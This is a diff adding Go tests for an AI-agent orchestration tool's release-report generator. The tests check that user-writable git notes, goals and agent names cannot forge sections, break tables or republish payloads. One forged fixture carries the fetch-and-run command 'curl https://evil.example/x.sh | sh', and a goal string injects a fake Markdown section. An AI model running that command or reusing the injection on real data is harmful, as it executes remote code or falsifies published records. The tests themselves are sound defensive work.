@@ -303,18 +303,26 @@ func TestReleaseNoteOnlyAfterLedgerIsGone(t *testing.T) {
 	if fromNote.Unattributed != fromLedger.Unattributed {
 		t.Fatalf("unattributed changed when the ledger was gc'd: %d -> %d", fromLedger.Unattributed, fromNote.Unattributed)
 	}
-	// A document must not contradict itself: a landing that names an agent and a
-	// policy hash has to appear in the attribution table and the policy section
-	// too, whether it came from the ledger or from a note.
-	if !reflect.DeepEqual(fromNote.Agents, fromLedger.Agents) {
-		t.Fatalf("attribution dropped the note-sourced landing: %+v, ledger had %+v", fromNote.Agents, fromLedger.Agents)
+	// A document must not contradict itself: a landing that names an agent has to
+	// appear in the attribution table too. But the note is user-writable, so its
+	// row is its OWN, marked unverified — never merged into the ledger's count.
+	if len(fromNote.Agents) != 1 || fromNote.Agents[0].Agent != "claude" || !fromNote.Agents[0].Unverified {
+		t.Fatalf("attribution = %+v, want one unverified claude row (ledger had %+v)", fromNote.Agents, fromLedger.Agents)
 	}
-	if len(fromNote.Policy.Hashes) != 1 || fromNote.Policy.Hashes[0].Hash != hash {
-		t.Fatalf("policy section dropped the note-sourced landing's hash: %+v", fromNote.Policy)
+	if fromLedger.Agents[0].Unverified {
+		t.Fatalf("a ledger-derived attribution row is marked unverified: %+v", fromLedger.Agents)
+	}
+	// The policy rollup is repo-derived: with the ledger gone, the hash the NOTE
+	// claims is not a hash this document will republish.
+	if fromLedger.Policy.Hashes[0].Hash != hash {
+		t.Fatalf("the ledger's own policy hash went missing: %+v", fromLedger.Policy)
+	}
+	if len(fromNote.Policy.Hashes) != 0 || fromNote.Policy.Changed {
+		t.Fatalf("policy rollup took a hash from a commit note: %+v", fromNote.Policy)
 	}
 	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
-	if strings.Contains(md, "No run in this range recorded") {
-		t.Fatalf("markdown says no policy was recorded while a landing names one:\n%s", md)
+	if !strings.Contains(md, "No run in this range recorded") {
+		t.Fatalf("markdown reports a policy nothing in the repo recorded:\n%s", md)
 	}
 }
 
@@ -459,7 +467,10 @@ func TestReleaseBisectDroppedAndSalvaged(t *testing.T) {
 		Strategy: "overlay", AgentCmd: "aider",
 		PerAgent: []perAgentJSON{
 			{ID: "keep", Branch: "agent/keep", SHA: shas[3], OK: true},
-			{ID: "drop", Branch: "agent/drop", SHA: hexSHA("c2"), OK: true},
+			// The DROPPED member's commit is in the range too — it reached it some
+			// other way. Only the landed half may be attributed, which is what the
+			// `landed` membership test in landedCommitsIn is for.
+			{ID: "drop", Branch: "agent/drop", SHA: shas[1], OK: true},
 		},
 		Integrate: integrateJSON{
 			Strategy: "overlay", Landed: []string{"agent/keep"},
@@ -967,5 +978,639 @@ func TestReleaseMixedHandAndSigboundCommits(t *testing.T) {
 	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
 	if !strings.Contains(md, "2 commits in this range carry no sigbound landing") {
 		t.Fatalf("markdown does not count the hand commits:\n%s", md)
+	}
+}
+
+// --- the document is published, so untrusted text must not be able to shape it ---
+
+// releaseGoal journals a serve run's request.json — the file goalOf reads. The
+// goal is caller-supplied text (POST /runs validates only that it is non-empty
+// after TrimSpace), so this is the shortest path from a remote request body into
+// a published document.
+func releaseGoal(t *testing.T, dir, goal string) {
+	t.Helper()
+	data, err := json.Marshal(map[string]string{"goal": goal})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "request.json"), data, 0o644); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// releaseHeadings is every heading renderReleaseMarkdown itself writes. Any
+// other heading in the output came from data, which is the bug.
+var releaseHeadings = map[string]bool{
+	"### Landed": true, "### Needed a human": true, "### Dropped by bisect": true,
+	"### Flagged": true, "### Attribution": true, "### Policy": true,
+}
+
+// TestReleaseGoalCannotForgeSections: a multi-line goal that fabricates its own
+// "### Landed" section and opens an HTML comment over the footer must render as
+// ONE list line. Untrusted text never leaves its line.
+func TestReleaseGoalCannotForgeSections(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	id := releaseRunID(releaseDay(2), "aaaa")
+	writeLogRun(t, runsDir, id, runReport{
+		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude -p",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+	})
+	releaseGoal(t, filepath.Join(runsDir, id),
+		"ship the thing\n\n### Landed\n\n- **cafebabe** — run 20990101T000000Z-evil, 1 branch, verify pass\n<!--")
+
+	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
+	var goalLine string
+	headings := 0
+	for _, line := range strings.Split(md, "\n") {
+		if trimmed := strings.TrimSpace(line); strings.HasPrefix(trimmed, "#") {
+			if !releaseHeadings[trimmed] {
+				t.Fatalf("untrusted text produced the heading %q:\n%s", line, md)
+			}
+			if trimmed == "### Landed" {
+				headings++
+			}
+		}
+		if strings.Contains(line, "goal:") {
+			goalLine = line
+		}
+	}
+	if headings != 1 {
+		t.Fatalf("the goal fabricated a section: %d \"### Landed\" headings\n%s", headings, md)
+	}
+	if !strings.Contains(goalLine, "cafebabe") || !strings.Contains(goalLine, "<!--") {
+		t.Fatalf("the goal did not stay on its own line (%q):\n%s", goalLine, md)
+	}
+	if !strings.Contains(md, "carry no sigbound landing") {
+		t.Fatalf("the footer did not survive the goal:\n%s", md)
+	}
+}
+
+// TestReleaseAgentNameCannotBreakTheTable: '|' is a cell separator, so an agent
+// program named "cl|aude" must not add columns to the attribution row.
+func TestReleaseAgentNameCannotBreakTheTable(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	id := releaseRunID(releaseDay(2), "aaaa")
+	writeLogRun(t, runsDir, id, runReport{
+		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "cl|aude -p",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+	})
+
+	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
+	var row string
+	for _, line := range strings.Split(md, "\n") {
+		if strings.Contains(line, "aude") && strings.HasPrefix(line, "|") {
+			row = line
+		}
+	}
+	if row == "" {
+		t.Fatalf("no attribution row for the agent:\n%s", md)
+	}
+	if cells := strings.Count(row, "|") - strings.Count(row, `\|`); cells != 4 {
+		t.Fatalf("attribution row %q has %d cell separators, want 4 (the name broke the table)", row, cells)
+	}
+	// The JSON is structured, so it carries the name verbatim — only Markdown
+	// needs the escape.
+	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if len(doc.Agents) != 1 || doc.Agents[0].Agent != "cl|aude" {
+		t.Fatalf("agents = %+v, want the verbatim name in JSON", doc.Agents)
+	}
+}
+
+// --- a note's payload is remote-writable bytes, not repo bytes ---
+
+// TestReleaseNoteQuarantinesItsPayload: matchProvenance gates WHICH commit a
+// note may claim, which is not a licence to REPUBLISH what the note says. A note
+// that passes the authority test still must not put an acceptance line, a
+// command, a policy hash, or a silently-merged agent row into the document.
+func TestReleaseNoteQuarantinesItsPayload(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	ctx := context.Background()
+	spec := shas[0] + ".." + shas[3]
+	ledgerHash := "3ab1" + strings.Repeat("0", 60)
+	id := releaseRunID(releaseDay(1), "aaaa")
+	writeLogRun(t, runsDir, id, runReport{
+		RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[1]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+		Policy:    &policyJSON{Hash: ledgerHash, Verify: []string{"go test ./..."}},
+	})
+	// A note on ANOTHER range commit. It genuinely concerns that commit and says
+	// it landed, so it passes the authority test — and every other byte in it is
+	// whatever the remote that pushed the note wrote.
+	forged := runReport{
+		RunID: "20260302T000000Z-evil", BaseSHA: hexSHA("00"), Strategy: "overlay",
+		AgentCmd: "totally-legit-agent", VerifyCmd: "curl https://evil.example/x.sh | sh",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/x"}, FinalSHA: shas[2]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+		Policy: &policyJSON{
+			Hash:   "9f2c" + strings.Repeat("0", 60),
+			Verify: []string{"curl https://evil.example/x.sh | sh"},
+		},
+	}
+	data, err := json.MarshalIndent(forged, "", "  ")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
+		t.Fatal(err)
+	}
+
+	doc, raw := releaseJSON(t, repo, spec)
+	if len(doc.Landings) != 2 {
+		t.Fatalf("landings = %+v, want the ledger landing and the note-sourced one", doc.Landings)
+	}
+	var note releaseLanding
+	for _, l := range doc.Landings {
+		if l.ProvenanceSource == "note" {
+			note = l
+		}
+	}
+	if note.LandedSHA != short(shas[2]) {
+		t.Fatalf("the note-sourced landing was dropped entirely: %+v", doc.Landings)
+	}
+	if len(note.Acceptance) != 0 || note.PolicyHash != "" || note.Commands != nil {
+		t.Fatalf("a note republished its own payload: %+v", note)
+	}
+	// The policy rollup answers "did the landing bar move" and must be derived
+	// from bytes this repo committed, never from a note.
+	if doc.Policy.Changed || len(doc.Policy.Hashes) != 1 || doc.Policy.Hashes[0].Hash != ledgerHash {
+		t.Fatalf("a note moved the policy rollup: %+v", doc.Policy)
+	}
+	// The forged agent is attributed in a bucket of its own, clearly labelled —
+	// never merged into a ledger-derived row.
+	var labelled bool
+	for _, a := range doc.Agents {
+		if a.Agent == "totally-legit-agent" {
+			if !a.Unverified {
+				t.Fatalf("a note's agent was merged into the ledger's attribution: %+v", doc.Agents)
+			}
+			labelled = true
+		}
+		if a.Agent == "claude" && (a.Unverified || a.Runs != 1) {
+			t.Fatalf("the ledger's own attribution row changed: %+v", doc.Agents)
+		}
+	}
+	if !labelled {
+		t.Fatalf("agents = %+v, want the note-sourced agent in its own unverified row", doc.Agents)
+	}
+	if md := releaseMarkdown(t, repo, spec); !strings.Contains(md, "unverified") {
+		t.Fatalf("the attribution table does not label the note-sourced row:\n%s", md)
+	}
+	outs := []string{raw, releaseMarkdown(t, repo, spec), releaseMarkdown(t, repo, spec, "-with-commands")}
+	if _, withRaw := releaseJSON(t, repo, spec, "-with-commands"); true {
+		outs = append(outs, withRaw)
+	}
+	for _, out := range outs {
+		if strings.Contains(out, "evil.example") {
+			t.Fatalf("a note's payload reached the published document:\n%s", out)
+		}
+	}
+}
+
+// --- the incomplete counter has to mean what the footer says ---
+
+// TestReleaseTornRunDirOutsideWindowIsCounted: landings are selected by
+// reachability, unwindowed, so a torn run dir outside the committer-date window
+// can still be the missing half of a range commit's attribution. Counting it
+// only inside the window let the footer claim "ledger and note are both gone"
+// about a ledger that is right there, merely unreadable.
+func TestReleaseTornRunDirOutsideWindowIsCounted(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	torn := filepath.Join(runsDir, releaseRunID(releaseDay(400), "bbbb"))
+	if err := os.MkdirAll(torn, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(torn, "report.json"), []byte("{ half-written"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if doc.Incomplete != 1 {
+		t.Fatalf("incomplete = %d, want 1: a torn dir outside the window is still a run this document could not read", doc.Incomplete)
+	}
+	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
+	if strings.Contains(md, "ledger and note are both gone") {
+		t.Fatalf("the footer claims the ledger is gone while a run dir is merely unreadable:\n%s", md)
+	}
+	if !strings.Contains(md, "unreadable") {
+		t.Fatalf("the footer hides the unreadable run dir:\n%s", md)
+	}
+}
+
+// --- one landing, one row, whatever the note omits ---
+
+// TestReleaseNotesWithoutRunIDCountOnceEach: dedupe keyed on runId alone
+// double-counted a hand-written or legacy note that omits it. The landed sha is
+// the fallback identity, so two notes describing the SAME landing are one row —
+// and a note describing a DIFFERENT landing is still its own row, which is the
+// half a blanket "no runId, no second row" rule would silently swallow.
+func TestReleaseNotesWithoutRunIDCountOnceEach(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	ctx := context.Background()
+	// Landing A: its integration commit AND its landed member tip are both in
+	// range, so BOTH carry a note describing it.
+	a := runReport{ // no runId at all
+		BaseSHA: shas[0], StartedAt: releaseDay(2).Format(time.RFC3339), Strategy: "overlay", AgentCmd: "claude -p",
+		PerAgent:  []perAgentJSON{{ID: "t1", Branch: "agent/t1", SHA: shas[3], OK: true}},
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+	}
+	// Landing B: a different run, also without a runId.
+	b := runReport{
+		BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), Strategy: "overlay", AgentCmd: "claude -p",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t9"}, FinalSHA: shas[1]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+	}
+	for _, n := range []struct {
+		sha string
+		rep runReport
+	}{{shas[2], a}, {shas[3], a}, {shas[1], b}} {
+		data, err := json.MarshalIndent(n.rep, "", "  ")
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := g.NoteAdd(ctx, "sigbound", n.sha, data); err != nil {
+			t.Fatal(err)
+		}
+	}
+
+	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if len(doc.Landings) != 2 {
+		t.Fatalf("landings = %d, want 2 — three notes, two landings: %+v", len(doc.Landings), doc.Landings)
+	}
+	landed := map[string]int{}
+	for _, l := range doc.Landings {
+		landed[l.LandedSHA]++
+	}
+	if landed[short(shas[2])] != 1 || landed[short(shas[1])] != 1 {
+		t.Fatalf("landings = %+v, want each landing exactly once", doc.Landings)
+	}
+	if doc.Unattributed != 0 {
+		t.Fatalf("unattributed = %d, want 0: all three noted commits are claimed", doc.Unattributed)
+	}
+	if len(doc.Agents) != 1 || doc.Agents[0].Runs != 2 || doc.Agents[0].Landed != 2 {
+		t.Fatalf("agents = %+v, want the two runs counted once each", doc.Agents)
+	}
+}
+
+// --- the guards the renderer/selector already carry, pinned ---
+
+// TestReleaseVerifyNoneIsRendered: a run with no -verify configured still lands
+// (landed() accepts an unset verify), and the document must SAY the verdict was
+// none rather than implying a green landing.
+func TestReleaseVerifyNoneIsRendered(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	id := releaseRunID(releaseDay(2), "aaaa")
+	writeLogRun(t, runsDir, id, runReport{
+		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude -p",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
+		// Verify deliberately zero: never ran.
+	})
+
+	doc, raw := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if len(doc.Landings) != 1 || doc.Landings[0].Verify != "none" {
+		t.Fatalf("verify = %+v, want the landing rendered with verdict none", doc.Landings)
+	}
+	if !strings.Contains(raw, `"verify": "none"`) {
+		t.Fatalf("-json does not carry the none verdict:\n%s", raw)
+	}
+	if md := releaseMarkdown(t, repo, shas[0]+".."+shas[3]); !strings.Contains(md, "verify none") {
+		t.Fatalf("markdown does not carry the none verdict:\n%s", md)
+	}
+}
+
+// TestReleaseNoteThatDidNotLandAttributesNothing: a note that genuinely concerns
+// a range commit but records it as FLAGGED, not landed, is not a landing. The
+// authority test answers; `landed` is the second, independent gate.
+func TestReleaseNoteThatDidNotLandAttributesNothing(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	ctx := context.Background()
+	rep := runReport{
+		RunID: "20260302T000000Z-note", BaseSHA: shas[0], Strategy: "overlay", AgentCmd: "claude",
+		PerAgent: []perAgentJSON{{ID: "x", Branch: "agent/x", SHA: shas[2], OK: true}},
+		Integrate: integrateJSON{
+			Strategy: "overlay", Landed: []string{"agent/other"},
+			Flagged: []flaggedJSON{{Branch: "agent/x"}}, FinalSHA: shas[1],
+		},
+		Verify: verifyJSON{Ran: true, OK: true},
+	}
+	data, err := json.MarshalIndent(rep, "", "  ")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
+		t.Fatal(err)
+	}
+
+	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if len(doc.Landings) != 0 {
+		t.Fatalf("a flagged member became a landing: %+v", doc.Landings)
+	}
+	if doc.Unattributed != doc.Commits {
+		t.Fatalf("unattributed = %d, want %d — nothing landed here", doc.Unattributed, doc.Commits)
+	}
+}
+
+// TestReleaseNoteDoesNotDoubleClaimALedgerRun: the ledger already rendered run
+// R. A note naming the SAME run adds its commit to R's claim, never a second
+// landing row or a second run in the attribution table.
+func TestReleaseNoteDoesNotDoubleClaimALedgerRun(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	ctx := context.Background()
+	id := releaseRunID(releaseDay(1), "aaaa")
+	writeLogRun(t, runsDir, id, runReport{
+		RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[1]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+	})
+	// The note's copy of the same run knows a member tip the ledger's copy does not.
+	noteRep := runReport{
+		RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
+		PerAgent: []perAgentJSON{{ID: "t2", Branch: "agent/t2", SHA: shas[2], OK: true}},
+		Integrate: integrateJSON{
+			Strategy: "overlay", Landed: []string{"agent/t1", "agent/t2"}, FinalSHA: shas[1],
+		},
+		Verify: verifyJSON{Ran: true, OK: true},
+	}
+	// A legacy copy of the same landing, on a third commit, carrying NO runId —
+	// it names the run only by its landed sha, and that is still the same landing.
+	legacy := noteRep
+	legacy.RunID = ""
+	legacy.PerAgent = []perAgentJSON{{ID: "t3", Branch: "agent/t3", SHA: shas[3], OK: true}}
+	legacy.Integrate.Landed = []string{"agent/t1", "agent/t3"}
+	for _, n := range []struct {
+		sha string
+		rep runReport
+	}{{shas[2], noteRep}, {shas[3], legacy}} {
+		data, err := json.MarshalIndent(n.rep, "", "  ")
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := g.NoteAdd(ctx, "sigbound", n.sha, data); err != nil {
+			t.Fatal(err)
+		}
+	}
+
+	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if len(doc.Landings) != 1 || doc.Landings[0].ProvenanceSource != "manifest" {
+		t.Fatalf("landings = %+v, want the ledger row exactly once", doc.Landings)
+	}
+	if len(doc.Agents) != 1 || doc.Agents[0].Runs != 1 || doc.Agents[0].Unverified {
+		t.Fatalf("agents = %+v, want the one ledger run counted once", doc.Agents)
+	}
+	if doc.Unattributed != 0 {
+		t.Fatalf("unattributed = %d, want 0 — both notes added their commit to the run's claim", doc.Unattributed)
+	}
+}
+
+// TestReleaseLandingsAreNewestFirst pins the order the docs promise, in both
+// shapes.
+func TestReleaseLandingsAreNewestFirst(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	older, newer := releaseRunID(releaseDay(1), "aaaa"), releaseRunID(releaseDay(2), "bbbb")
+	writeLogRun(t, runsDir, older, runReport{
+		RunID: older, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"a"}, FinalSHA: shas[1]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+	})
+	writeLogRun(t, runsDir, newer, runReport{
+		RunID: newer, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"a"}, FinalSHA: shas[2]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+	})
+
+	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if len(doc.Landings) != 2 || doc.Landings[0].RunID != newer || doc.Landings[1].RunID != older {
+		t.Fatalf("landings = %+v, want newest-first", doc.Landings)
+	}
+	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
+	if strings.Index(md, short(shas[2])) > strings.Index(md, short(shas[1])) {
+		t.Fatalf("markdown renders the older landing first:\n%s", md)
+	}
+}
+
+// TestReleaseServeRefusesRangeByGrammar: the endpoint applies parseReleaseRange's
+// grammar to the two halves BEFORE git sees them, so a `from` that is itself a
+// range is refused with the grammar's own message rather than a rev-parse
+// diagnostic about an endpoint the caller never wrote.
+func TestReleaseServeRefusesRangeByGrammar(t *testing.T) {
+	_, repo, shas := releaseRepo(t)
+	_, ts := newTestServer(t, "", repo)
+	var body struct {
+		Error string `json:"error"`
+		Code  string `json:"code"`
+	}
+	url := ts.URL + "/log/release?from=" + shas[0] + ".." + shas[1] + "&to=" + shas[3]
+	if code := doJSON(t, "GET", url, "", nil, &body); code != http.StatusBadRequest {
+		t.Fatalf("GET /log/release with a range as `from` = %d, want 400", code)
+	}
+	if !strings.Contains(body.Error, "FROM..TO") {
+		t.Fatalf("400 message %q does not name the grammar", body.Error)
+	}
+}
+
+// TestReleaseInvertedWindowSaysSo: the attention window is framed on committer
+// dates, so a range whose FROM commit is NEWER than its TO commit (a rebase, a
+// cherry-pick, a skewed clock) has an empty window — no run start can fall
+// inside it. Zero attention items would otherwise read as "nothing needed a
+// human", which is a different claim entirely.
+func TestReleaseInvertedWindowSaysSo(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	// A descendant of the last commit, dated BEFORE the first one.
+	backdated := releaseCommit(t, repo, "late.txt", "x\n", releaseDay(0).Add(-time.Hour))
+	writeLogRun(t, runsDir, releaseRunID(releaseDay(2), "aaaa"), runReport{
+		BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude",
+		Integrate: integrateJSON{Strategy: "overlay", Flagged: []flaggedJSON{{Branch: "agent/x"}}},
+	})
+
+	doc, _ := releaseJSON(t, repo, shas[3]+".."+backdated)
+	if doc.Commits != 1 {
+		t.Fatalf("commits = %d, want the one backdated commit", doc.Commits)
+	}
+	if !doc.Window.Inverted {
+		t.Fatalf("window = %+v, want it marked inverted", doc.Window)
+	}
+	if len(doc.Flagged) != 0 {
+		t.Fatalf("an inverted window selected attention items: %+v", doc.Flagged)
+	}
+	if md := releaseMarkdown(t, repo, shas[3]+".."+backdated); !strings.Contains(md, "INVERTED") {
+		t.Fatalf("markdown hides the inverted window:\n%s", md)
+	}
+	// A normal range says nothing about inversion, in either shape.
+	fwd, fwdRaw := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	if fwd.Window.Inverted || strings.Contains(fwdRaw, "inverted") {
+		t.Fatalf("a forward range claims an inverted window: %s", fwdRaw)
+	}
+}
+
+// TestReleaseJSONShapeIsGolden pins the -json document byte for byte over a
+// fixed fixture — key names, key ORDER, nesting and omissions — so "stable and
+// documented" is enforced mechanically instead of by spot-checking that a few
+// keys exist. Commit shas are the only thing substituted (they depend on the
+// machine's clock through the author date).
+func TestReleaseJSONShapeIsGolden(t *testing.T) {
+	g, repo, shas := releaseRepo(t)
+	runsDir := logRunsDir(t, g)
+	ctx := context.Background()
+	id := releaseRunID(releaseDay(2), "aaaa")
+	writeLogRun(t, runsDir, id, runReport{
+		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
+		Strategy: "overlay", AgentCmd: "claude -p", Source: "watch", Intent: "billing-rates",
+		Tasks: []taskSpec{{ID: "t1"}, {ID: "t2"}},
+		PerAgent: []perAgentJSON{
+			{ID: "t1", Branch: "agent/t1", SHA: shas[3], OK: true},
+			{ID: "t2", Branch: "agent/t2", SHA: hexSHA("c2"), OK: true},
+		},
+		Integrate: integrateJSON{
+			Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2],
+			DroppedByBisect: []string{"agent/t2"}, Flagged: []flaggedJSON{{Branch: "agent/t3"}},
+		},
+		Verify: verifyJSON{Ran: true, OK: true, Repaired: true, Bisect: &bisectJSON{Ran: true, Attempts: 3}},
+		Policy: &policyJSON{Hash: "9f2c" + strings.Repeat("0", 60), Verify: []string{"go test ./..."}},
+	})
+	dir := filepath.Join(runsDir, id)
+	releaseGoal(t, dir, "raise the billing rates")
+	writeReleasePark(t, dir, releaseDay(2))
+	// A second run that survives only as a note, so the quarantined shape is
+	// pinned too.
+	noteRep := runReport{
+		RunID: releaseRunID(releaseDay(1), "bbbb"), BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339),
+		Strategy: "overlay", AgentCmd: "aider",
+		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/n1"}, FinalSHA: shas[1]},
+		Verify:    verifyJSON{Ran: true, OK: true},
+		Policy:    &policyJSON{Hash: "3ab1" + strings.Repeat("0", 60), Verify: []string{"make check"}},
+	}
+	data, err := json.MarshalIndent(noteRep, "", "  ")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := g.NoteAdd(ctx, "sigbound", shas[1], data); err != nil {
+		t.Fatal(err)
+	}
+
+	_, raw := releaseJSON(t, repo, shas[0]+".."+shas[3])
+	for i, sha := range shas { // full shas first; what is left of one is its short form
+		raw = strings.ReplaceAll(raw, sha, fmt.Sprintf("<sha%d>", i))
+	}
+	for i, sha := range shas {
+		raw = strings.ReplaceAll(raw, short(sha), fmt.Sprintf("<short%d>", i))
+	}
+	const want = `{
+  "from": "<sha0>",
+  "fromSHA": "<sha0>",
+  "to": "<sha3>",
+  "toSHA": "<sha3>",
+  "commits": 3,
+  "window": {
+    "start": "2026-03-01T12:00:00Z",
+    "end": "2026-03-04T12:00:00Z"
+  },
+  "landings": [
+    {
+      "runId": "20260303T120000Z-aaaa",
+      "startedAt": "2026-03-03T12:00:00Z",
+      "source": "watch",
+      "intent": "billing-rates",
+      "goal": "raise the billing rates",
+      "tasks": [
+        "t1",
+        "t2"
+      ],
+      "landedSHA": "<short2>",
+      "members": 1,
+      "strategy": "overlay",
+      "verify": "pass",
+      "verifyDetail": {
+        "repaired": true
+      },
+      "acceptance": [
+        "go test ./..."
+      ],
+      "agent": "claude",
+      "policyHash": "9f2c000000000000000000000000000000000000000000000000000000000000",
+      "provenanceSource": "manifest"
+    },
+    {
+      "runId": "20260302T120000Z-bbbb",
+      "startedAt": "2026-03-02T12:00:00Z",
+      "landedSHA": "<short1>",
+      "members": 1,
+      "strategy": "overlay",
+      "verify": "pass",
+      "agent": "aider",
+      "provenanceSource": "note"
+    }
+  ],
+  "parked": [
+    {
+      "runId": "20260303T120000Z-aaaa",
+      "status": "awaiting-ack",
+      "reason": "ack-paths",
+      "branches": [
+        "agent/t7"
+      ],
+      "matchedPaths": {
+        "billing/rates.go": "billing/**"
+      },
+      "attempts": 1,
+      "expiresAt": "2026-03-03T13:00:00Z"
+    }
+  ],
+  "dropped": [
+    {
+      "runId": "20260303T120000Z-aaaa",
+      "branches": [
+        "agent/t2"
+      ],
+      "attempts": 3
+    }
+  ],
+  "flagged": [
+    {
+      "runId": "20260303T120000Z-aaaa",
+      "branches": [
+        "agent/t3"
+      ]
+    }
+  ],
+  "agents": [
+    {
+      "agent": "aider",
+      "runs": 1,
+      "landed": 1,
+      "unverified": true
+    },
+    {
+      "agent": "claude",
+      "runs": 1,
+      "landed": 1
+    }
+  ],
+  "policy": {
+    "changed": false,
+    "hashes": [
+      {
+        "hash": "9f2c000000000000000000000000000000000000000000000000000000000000",
+        "firstRunId": "20260303T120000Z-aaaa"
+      }
+    ]
+  },
+  "unattributed": 0,
+  "incomplete": 0,
+  "withCommands": false
+}
+`
+	if raw != want {
+		t.Fatalf("release -json shape drifted.\n--- got ---\n%s\n--- want ---\n%s", raw, want)
 	}
 }
